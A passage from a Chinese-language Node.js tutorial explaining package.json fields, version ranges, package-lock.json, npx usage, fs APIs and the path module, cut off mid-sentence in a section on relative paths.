punctuation">}</span></code></pre><p><code>package.json</code>文件就是一个JSON对象，该对象的每一个成员就是当前项目的一项设置。比如<code>name</code>就是项目名称，<code>version</code>是版本（遵守“大版本.次要版本.小版本”的格式）。</p><p>下面是一个更完整的package.json文件。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Hello World"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"张三"</span><span class="token punctuation">,</span>    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"第一个node.js程序"</span><span class="token punctuation">,</span>    <span class="token property">"keywords"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"node.js"</span><span class="token punctuation">,</span><span class="token string">"javascript"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"repository"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"git"</span><span class="token punctuation">,</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://path/to/url"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"license"</span><span class="token operator">:</span><span class="token string">"MIT"</span><span class="token punctuation">,</span>    <span class="token property">"engines"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"node"</span><span class="token operator">:</span> <span class="token string">"0.10.x"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"bugs"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"http://path/to/bug"</span><span class="token punctuation">,</span><span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"bug@example.com"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"contributors"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"李四"</span><span class="token punctuation">,</span><span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"lisi@example.com"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node index.js"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"latest"</span><span class="token punctuation">,</span>        <span class="token property">"mongoose"</span><span class="token operator">:</span> <span class="token string">"~3.8.3"</span><span class="token punctuation">,</span>        <span class="token property">"handlebars-runtime"</span><span class="token operator">:</span> <span class="token string">"~1.0.12"</span><span class="token punctuation">,</span>        <span class="token property">"express3-handlebars"</span><span class="token operator">:</span> <span class="token string">"~0.5.0"</span><span class="token punctuation">,</span>        <span class="token property">"MD5"</span><span class="token operator">:</span> <span class="token string">"~1.2.0"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"bower"</span><span class="token operator">:</span> <span class="token string">"~1.2.8"</span><span class="token punctuation">,</span>        <span class="token property">"grunt"</span><span class="token operator">:</span> <span class="token string">"~0.4.1"</span><span class="token punctuation">,</span>        <span class="token property">"grunt-contrib-concat"</span><span class="token operator">:</span> <span class="token string">"~0.3.0"</span><span class="token punctuation">,</span>        <span class="token property">"grunt-contrib-jshint"</span><span class="token operator">:</span> <span class="token string">"~0.7.2"</span><span class="token punctuation">,</span>        <span class="token property">"grunt-contrib-uglify"</span><span class="token operator">:</span> <span class="token string">"~0.2.7"</span><span class="token punctuation">,</span>        <span class="token property">"grunt-contrib-clean"</span><span class="token operator">:</span> <span class="token string">"~0.5.0"</span><span class="token punctuation">,</span>        <span class="token property">"browserify"</span><span class="token operator">:</span> <span class="token string">"2.36.1"</span><span class="token punctuation">,</span>        <span class="token property">"grunt-browserify"</span><span class="token operator">:</span> <span class="token string">"~1.3.0"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>下面详细解释package.json文件的各个字段。</p><h6 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h6><p><code>dependencies</code>字段指定了项目运行所依赖的模块，<code>devDependencies</code>指定项目开发所需要的模块。</p><p>它们都指向一个对象。该对象的各个成员，分别由模块名和对应的版本要求组成，表示依赖的模块及其版本范围。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"browserify"</span><span class="token operator">:</span> <span class="token string">"~13.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"karma-browserify"</span><span class="token operator">:</span> <span class="token string">"~5.0.1"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>对应的版本可以加上各种限定，主要有以下几种：</p><ul><li><strong>指定版本</strong>：比如<code>1.2.2</code>，遵循“大版本.次要版本.小版本”的格式规定，安装时只安装指定版本。</li><li><strong>波浪号（tilde）+指定版本</strong>：比如<code>~1.2.2</code>，表示安装1.2.x的最新版本（不低于1.2.2），但是不安装1.3.x，也就是说安装时不改变大版本号和次要版本号。</li><li><strong>插入号（caret）+指定版本</strong>：比如ˆ1.2.2，表示安装1.x.x的最新版本（不低于1.2.2），但是不安装2.x.x，也就是说安装时不改变大版本号。需要注意的是，如果大版本号为0，则插入号的行为与波浪号相同，这是因为此时处于开发阶段，即使是次要版本号变动，也可能带来程序的不兼容。</li><li><strong>latest</strong>：安装最新版本。</li></ul><h6 id="main"><a href="#main" class="headerlink" title="main"></a>main</h6><p><code>main</code>字段指定了加载的入口文件，<code>require('moduleName')</code>就会加载这个文件。这个字段的默认值是模块根目录下面的<code>index.js</code>。</p><h6 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h6><p><code>scripts</code>指定了运行脚本命令的npm命令行缩写，比如start指定了运行<code>npm run start</code>时，所要执行的命令。</p><p>下面的设置指定了<code>npm run preinstall</code>、<code>npm run postinstall</code>、<code>npm run start</code>、<code>npm run test</code>时，所要执行的命令。</p><pre class=" language-json"><code class="language-json"><span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"preinstall"</span><span class="token operator">:</span> <span class="token string">"echo here it comes!"</span><span class="token punctuation">,</span>    <span class="token property">"postinstall"</span><span class="token operator">:</span> <span class="token string">"echo there it goes!"</span><span class="token punctuation">,</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node index.js"</span><span class="token punctuation">,</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"tap test/*.js"</span><span class="token punctuation">}</span></code></pre><blockquote><p>扩展阅读：<a href="http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html" target="_blank" rel="noopener">npm scripts 使用指南</a></p></blockquote><h4 id="package-lock-json"><a href="#package-lock-json" class="headerlink" title="package-lock.json"></a>package-lock.json</h4><p>npm 5 以前是不会有 <code>package-lock.json</code> 这个文件的。（被开发者诟病，吐槽的问题）。</p><p>以前会自作多情的自动给你升级。</p><p>npm 5 以后才加入了这个文件。</p><p>当你安装包的时候，npm 都会生成或者更新 <code>package-lock.json</code> 这个文件。</p><ul><li>npm 5 以后的版本安装包不需要加 <code>--save</code> 参数，它会自动保存依赖信息</li><li>当你安装包的时候，会自动创建或者是更新 <code>package-lock.json</code> 这个文件</li><li><code>package-lock.json</code> 这个文件会保存 <code>node_modules</code> 中所有包的信息（版本、下载地址）<ul><li>这样的话重新 <code>npm install</code> 的时候速度就可以提升</li></ul></li><li>从文件来看，有一个 <code>lock</code> 称之为锁<ul><li>这个 <code>lock</code> 是用来锁定版本的</li><li>如果项目依赖了 <code>1.1.1</code> 版本</li><li>如果你重新 isntall 其实会下载最新版本，而不是 1.1.1</li><li>我们的目的就是希望可以锁住 1.1.1 这个版本</li><li>所以这个 <code>package-lock.json</code> 这个文件的另一个作用就是锁定版本号，防止自动升级新版</li></ul></li></ul><h4 id="npx"><a href="#npx" class="headerlink" title="npx"></a>npx</h4><blockquote><p>参考链接：</p><ul><li><a href="http://www.ruanyifeng.com/blog/2019/02/npx.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/02/npx.html</a></li><li><a href="https://github.com/zkat/npx" target="_blank" rel="noopener">https://github.com/zkat/npx</a></li><li><a href="https://www.jianshu.com/p/cee806439865" target="_blank" rel="noopener">https://www.jianshu.com/p/cee806439865</a></li></ul></blockquote><p>npm 从5.2版开始，增加了 npx 命令。</p><p><img src="/images/bg2019020901.jpg" alt="img"></p><p>Node 自带 npm 模块，所以可以直接使用 npx 命令。万一不能用，就要手动安装一下。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g npx</code></pre><h6 id="调用项目安装的模块"><a href="#调用项目安装的模块" class="headerlink" title="调用项目安装的模块"></a>调用项目安装的模块</h6><p>npx 想要解决的主要问题，就是调用项目内部安装的模块。比如，项目内部安装了测试工具 <a href="http://www.ruanyifeng.com/blog/2015/12/a-mocha-tutorial-of-examples.html" target="_blank" rel="noopener">Mocha</a>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -D mocha</code></pre><p>一般来说，调用 Mocha ，只能在项目脚本和 package.json 的<a href="http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html" target="_blank" rel="noopener"><code>scripts</code></a>字段里面， 如果想在命令行下调用，必须像下面这样。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 项目的根目录下执行</span>$ node-modules/.bin/mocha --version</code></pre><p>npx 就是想解决这个问题，让项目内部安装的模块用起来更方便，只要像下面这样调用就行了。</p><pre class=" language-bash"><code class="language-bash">npx mocha --version</code></pre><p>npx 的原理很简单，就是运行的时候，会到<code>node_modules/.bin</code>路径和环境变量<code>$PATH</code>里面，检查命令是否存在。</p><p>由于 npx 会检查环境变量<code>$PATH</code>，所以系统命令也可以调用。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 等同于 ls</span>npx <span class="token function">ls</span></code></pre><p>注意，Bash 内置的命令不在<code>$PATH</code>里面，所以不能用。比如，<code>cd</code>是 Bash 命令，因此就不能用<code>npx cd</code>。</p><h6 id="避免全局安装模块"><a href="#避免全局安装模块" class="headerlink" title="避免全局安装模块"></a>避免全局安装模块</h6><p>除了调用项目内部模块，npx 还能避免全局安装的模块。比如，<code>create-react-app</code>这个模块是全局安装，npx 可以运行它，而且不进行全局安装。</p><pre class=" language-bash"><code class="language-bash">npx create-react-app my-react-app</code></pre><p>上面代码运行时，npx 将<code>create-react-app</code>下载到一个临时目录，使用以后再删除。所以，以后再次执行上面的命令，会重新下载<code>create-react-app</code>。</p><p>下载全局模块时，npx 允许指定版本。</p><pre class=" language-bash"><code class="language-bash">npx uglify-js@3.1.0 main.js -o ./dist/main.js</code></pre><p>上面代码指定使用 3.1.0 版本的<code>uglify-js</code>压缩脚本。</p><p>注意，只要 npx 后面的模块无法在本地发现，就会下载同名模块。比如，本地没有安装<code>http-server</code>模块，下面的命令会自动下载该模块，在当前目录启动一个 Web 服务。</p><pre class=" language-bash"><code class="language-bash">npx http-server</code></pre><h6 id="–no-install-参数和-–ignore-existing-参数"><a href="#–no-install-参数和-–ignore-existing-参数" class="headerlink" title="–no-install 参数和 –ignore-existing 参数"></a>–no-install 参数和 –ignore-existing 参数</h6><p>如果想让 npx 强制使用本地模块，不下载远程模块，可以使用<code>--no-install</code>参数。如果本地不存在该模块，就会报错。</p><pre class=" language-bash"><code class="language-bash">npx --no-install http-server</code></pre><p>反过来，如果忽略本地的同名模块，强制安装使用远程模块，可以使用<code>--ignore-existing</code>参数。比如，本地已经全局安装了<code>create-react-app</code>，但还是想使用远程模块，就用这个参数。</p><pre class=" language-bash"><code class="language-bash">npx --ignore-existing create-react-app my-react-app</code></pre><h6 id="使用不同版本的-node"><a href="#使用不同版本的-node" class="headerlink" title="使用不同版本的 node"></a>使用不同版本的 node</h6><p>利用 npx 可以下载模块这个特点，可以指定某个版本的 Node 运行脚本。它的窍门就是使用 npm 的 <a href="https://www.npmjs.com/package/node" target="_blank" rel="noopener">node 模块</a>。</p><pre class=" language-bash"><code class="language-bash">npx node@0.12.8 -vv0.12.8</code></pre><p>上面命令会使用 0.12.8 版本的 Node 执行脚本。原理是从 npm 下载这个版本的 node，使用后再删掉。</p><p>某些场景下，这个方法用来切换 Node 版本，要比 nvm 那样的版本管理器方便一些。</p><h6 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h6><ul><li><a href="http://www.ruanyifeng.com/blog/2019/02/npx.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/02/npx.html</a></li></ul><h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><ul><li><p><a href="http://javascript.ruanyifeng.com/nodejs/npm.html" target="_blank" rel="noopener">npm 模块管理器</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2016/01/npm-install.html" target="_blank" rel="noopener">npm 模块安装机制</a></p></li></ul><h4 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h4><p><img src="/images/7651625dly1g1zpkqov7pj20hs0m8762.jpg" alt="img"></p><h2 id="第6章-文件操作"><a href="#第6章-文件操作" class="headerlink" title="第6章 文件操作"></a>第6章 文件操作</h2><p><strong>学习目标</strong></p><ul><li>理解同步和异步概念</li><li>掌握基本的文件读写</li><li>掌握 path 模块基本使用</li><li>理解文件操作的相对路径</li></ul><h4 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h4><p>fs模块对文件的几乎所有操作都有同步和异步两种形式，例如：<code>readFile()</code> 和 <code>readFileSync()</code>。</p><p>同步与异步文件系统调用的区别</p><ul><li>同步调用立即执行，会阻塞后续代码继续执行，如果想要捕获异常需要使用 <code>try-catch</code></li><li>异步调用不会阻塞后续代码继续执行，需要回调函数作为额外的参数，通常包含一个错误作为回调函数的第一个参数</li><li>异步调用通过判断第一个err对象来处理异常</li><li>异步调用结果往往通过回调函数来进行获取</li></ul><p>Node 只在文件IO操作中，提供了同步调用和异步调用两种形式，两者可以结合使用，<br>但是推荐能使用异步调用解决问题的情况下，少用同步调用。</p><p>对于文件操作，Node 几乎为所有的文件操作 API 提供了同步操作和异步操作两种方式。</p><ul><li>同步会阻塞程序的执行，效率低（知道就行）</li><li>异步相当于多找了一个人帮你干活，效率高</li><li>所以建议：尽量使用异步</li></ul><h4 id="常用-API"><a href="#常用-API" class="headerlink" title="常用 API"></a>常用 API</h4><table><thead><tr><th>API</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>fs.access(path, callback)</td><td>判断路径是否存在</td><td></td></tr><tr><td>fs.appendFile(file, data, callback)</td><td>向文件中追加内容</td><td></td></tr><tr><td>fs.copyFile(src, callback)</td><td>复制文件</td><td></td></tr><tr><td>fs.mkdir(path, callback)</td><td>创建目录</td><td></td></tr><tr><td>fs.readDir(path, callback)</td><td>读取目录列表</td><td></td></tr><tr><td>fs.rename(oldPath, newPath, callback)</td><td>重命名文件/目录</td><td></td></tr><tr><td>fs.rmdir(path, callback)</td><td>删除目录</td><td>只能删除空目录</td></tr><tr><td>fs.stat(path, callback)</td><td>获取文件/目录信息</td><td></td></tr><tr><td>fs.unlink(path, callback)</td><td>删除文件</td><td></td></tr><tr><td>fs.watch(filename[, options][, listener])</td><td>监视文件/目录</td><td></td></tr><tr><td>fs.watchFile(filename[, options], listener)</td><td>监视文件</td><td></td></tr></tbody></table><h4 id="案例：Markdown-文件转换器"><a href="#案例：Markdown-文件转换器" class="headerlink" title="案例：Markdown 文件转换器"></a>案例：Markdown 文件转换器</h4><blockquote><p>需求：用户编写 md 格式的文件，实时的编译成 html 文件</p></blockquote><h4 id="监视文件-目录"><a href="#监视文件-目录" class="headerlink" title="监视文件/目录"></a>监视文件/目录</h4><ul><li><a href="https://nodejs.org/dist/latest-v10.x/docs/api/fs.html##fs_fs_watch_filename_options_listener" target="_blank" rel="noopener">fs.watch(filename[, options][, listener])</a></li><li><a href="https://nodejs.org/dist/latest-v10.x/docs/api/fs.html##fs_fs_watchfile_filename_options_listener" target="_blank" rel="noopener">fs.watchFile(filename[, options], listener)</a></li></ul><h4 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h4><ul><li><a href="https://nodejs.org/dist/latest-v10.x/docs/api/fs.html##fs_fs_createreadstream_path_options" target="_blank" rel="noopener">fs.createReadStream(path[, options])</a></li><li><a href="https://nodejs.org/dist/latest-v10.x/docs/api/fs.html##fs_fs_createwritestream_path_options" target="_blank" rel="noopener">fs.createWriteStream(path[, options])</a></li></ul><h4 id="path-模块"><a href="#path-模块" class="headerlink" title="path 模块"></a>path 模块</h4><blockquote><p>参考文档：<a href="https://nodejs.org/dist/latest-v9.x/docs/api/path.html" target="_blank" rel="noopener">https://nodejs.org/dist/latest-v9.x/docs/api/path.html</a></p></blockquote><p><code>path</code> 是 Node 本身提供的一个核心模块，专门用来处理路径。</p><p>使用它的第一步就是先加载：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h6 id="path-basename"><a href="#path-basename" class="headerlink" title="path.basename"></a>path.basename</h6><blockquote><p>获取一个路径的文件名部分</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string">'/foo/bar/baz/asdf/quux.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: 'quux.html'</span>path<span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string">'/foo/bar/baz/asdf/quux.html'</span><span class="token punctuation">,</span> <span class="token string">'.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: 'quux'</span></code></pre><h6 id="path-dirname"><a href="#path-dirname" class="headerlink" title="path.dirname"></a>path.dirname</h6><blockquote><p>获取一个路径的目录部分</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token string">'/foo/bar/baz/asdf/quux'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/foo/bar/baz/asdf'</span></code></pre><h6 id="path-extname"><a href="#path-extname" class="headerlink" title="path.extname"></a>path.extname</h6><blockquote><p>获取一个路径的后缀名部分</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '.html'</span>path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span><span class="token string">'index.coffee.md'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '.md'</span>path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span><span class="token string">'index.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '.'</span>path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: ''</span>path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span><span class="token string">'.index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: ''</span></code></pre><h6 id="path-parse"><a href="#path-parse" class="headerlink" title="path.parse"></a>path.parse</h6><blockquote><p>将一个路径转换为一个对象，得到路径的各个组成部分</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'/home/user/dir/file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns:</span><span class="token comment" spellcheck="true">// { root: '/',</span><span class="token comment" spellcheck="true">//   dir: '/home/user/dir',</span><span class="token comment" spellcheck="true">//   base: 'file.txt',</span><span class="token comment" spellcheck="true">//   ext: '.txt',</span><span class="token comment" spellcheck="true">//   name: 'file' }</span></code></pre><h6 id="path-format-pathObject"><a href="#path-format-pathObject" class="headerlink" title="path.format(pathObject)"></a>path.format(pathObject)</h6><blockquote><p>将具有特定属性的对象转换为一个路径</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// If `dir`, `root` and `base` are provided,</span><span class="token comment" spellcheck="true">// `${dir}${path.sep}${base}`</span><span class="token comment" spellcheck="true">// will be returned. `root` is ignored.</span>path<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  root<span class="token punctuation">:</span> <span class="token string">'/ignored'</span><span class="token punctuation">,</span>  dir<span class="token punctuation">:</span> <span class="token string">'/home/user/dir'</span><span class="token punctuation">,</span>  base<span class="token punctuation">:</span> <span class="token string">'file.txt'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/home/user/dir/file.txt'</span><span class="token comment" spellcheck="true">// `root` will be used if `dir` is not specified.</span><span class="token comment" spellcheck="true">// If only `root` is provided or `dir` is equal to `root` then the</span><span class="token comment" spellcheck="true">// platform separator will not be included. `ext` will be ignored.</span>path<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  root<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>  base<span class="token punctuation">:</span> <span class="token string">'file.txt'</span><span class="token punctuation">,</span>  ext<span class="token punctuation">:</span> <span class="token string">'ignored'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/file.txt'</span><span class="token comment" spellcheck="true">// `name` + `ext` will be used if `base` is not specified.</span>path<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  root<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>  name<span class="token punctuation">:</span> <span class="token string">'file'</span><span class="token punctuation">,</span>  ext<span class="token punctuation">:</span> <span class="token string">'.txt'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/file.txt'</span></code></pre><h6 id="path-join"><a href="#path-join" class="headerlink" title="path.join"></a>path.join</h6><blockquote><p>将多个路径拼接为一个</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'/foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz/asdf'</span><span class="token punctuation">,</span> <span class="token string">'quux'</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/foo/bar/baz/asdf'</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// throws 'TypeError: Path must be a string. Received {}'</span></code></pre><h6 id="path-isAbsolute"><a href="#path-isAbsolute" class="headerlink" title="path.isAbsolute"></a>path.isAbsolute</h6><blockquote><p>判断一个路径是否是绝对路径</p></blockquote><p>Unix:</p><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'/foo/bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'/baz/..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'qux/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// false</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// false</span></code></pre><p>Windows:</p><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'//server'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span> <span class="token boolean">true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'\\\\server'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'C:/foo/..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'C:\\foo\\..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'bar\\baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// false</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'bar/baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// false</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// false</span></code></pre><h6 id="path-normalize-path"><a href="#path-normalize-path" class="headerlink" title="path.normalize(path)"></a>path.normalize(path)</h6><blockquote><p>将一个非标准路径标准化</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token string">'/foo/bar//baz/asdf/quux/..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/foo/bar/baz/asdf'</span>path<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token string">'C:\\temp\\\\foo\\bar\\..\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: 'C:\\temp\\foo\\'</span></code></pre><h6 id="path-resolve-…paths"><a href="#path-resolve-…paths" class="headerlink" title="path.resolve([…paths])"></a>path.resolve([…paths])</h6><blockquote><p>类似于 <code>path.join()</code> ，也是用来路径拼接</p></blockquote><pre class=" language-javascript"><code class="language-javascript">path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'/foo/bar'</span><span class="token punctuation">,</span> <span class="token string">'./baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/foo/bar/baz'</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'/foo/bar'</span><span class="token punctuation">,</span> <span class="token string">'/tmp/file/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Returns: '/tmp/file'</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'wwwroot'</span><span class="token punctuation">,</span> <span class="token string">'static_files/png/'</span><span class="token punctuation">,</span> <span class="token string">'../gif/image.gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// if the current working directory is /home/myself/node,</span><span class="token comment" spellcheck="true">// this returns '/home/myself/node/wwwroot/static_files/gif/image.gif'</span></code></pre><h4 id="文件操作的相对路径"><a href="#文件操作的相对路径" class="headerlink" title="文件操作的相对路径"></a>文件操作的相对路径</h4><blockquote><p>建议：以后操作文件使用相对路径都使用 <code>path.join()</code> 方法结合 <code>__dirname</code> 来避免问题。</p></blockquote><h6 id="路径分类"><a href="#路径分类" class="headerlink" title="路径分类"></a>路径分类</h6><p>和大多数路径规则一样，在 Node 中的路径规则同样遵守以下方式：</p><ul><li>绝对路径<ul><li>以 <code>/</code> 开头的路径，例如 <code>/a/b/c</code><ul><li>在 Linux 中就是操作系统的根路径</li><li>在 Windows 中是当前 JavaScript 脚本所属磁盘根路径</li></ul></li><li>以 <code>c:/</code> 开头的盘符路径，例如 <code>c:/a/b/c</code></li></ul></li><li>相对路径<ul><li>以 <code>./</code> 开头的相对路径，例如 <code>./a/b/c</code><ul><li>在这里 <code>./</code> 可以省略，<code>a/b/c</code> 等价于 <code>./a/b/c</code></li><li>注意，<code>.</code> 不能省略，否则 <code>/a/b/c</code> 